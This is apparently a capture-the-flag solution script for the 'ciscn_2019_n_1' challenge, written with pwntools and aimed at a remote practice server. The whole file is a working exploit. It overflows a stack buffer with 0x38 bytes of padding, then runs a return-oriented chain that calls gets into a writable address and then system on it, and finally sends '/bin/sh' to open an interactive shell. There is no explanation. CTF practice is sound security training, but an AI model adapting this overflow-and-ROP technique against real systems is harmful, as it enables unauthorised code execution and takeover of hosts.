from pwn import*
#p=process('./ciscn_2019_n_1')
elf=ELF('./ciscn_2019_n_1')
p=remote('node4.buuoj.cn',29036)
#data=0x4007cc
pop_rdi=0x400793
data=0x601041
gets_plt=elf.plt['gets']
sys=elf.plt['system']

payload=b'a'*(0x30+8)+p64(pop_rdi)+p64(data)+p64(gets_plt)+p64(pop_rdi)+p64(data)+p64(sys)
p.recvuntil(b'number.')
p.sendline(payload)
p.sendline(b'/bin/sh\x00')

p.interactive()